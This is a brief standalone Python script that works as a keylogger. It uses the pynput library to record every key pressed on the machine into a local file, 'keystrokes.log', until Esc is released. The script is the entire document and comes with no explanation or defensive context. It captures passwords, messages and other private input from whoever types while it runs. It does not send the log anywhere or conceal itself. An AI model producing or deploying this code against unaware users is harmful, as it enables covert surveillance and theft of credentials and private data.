from pynput.keyboard import Key, Listener


log_file = "keystrokes.log"

def on_press(key):
    key_str = str(key)
    if key == Key.space:
        key_str = ' '
    elif key == Key.enter:
        key_str = '\n'
    with open(log_file, 'a') as f:
        f.write(key_str)
    

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press= on_press, on_release= on_release) as listener:
    listener.join()


    

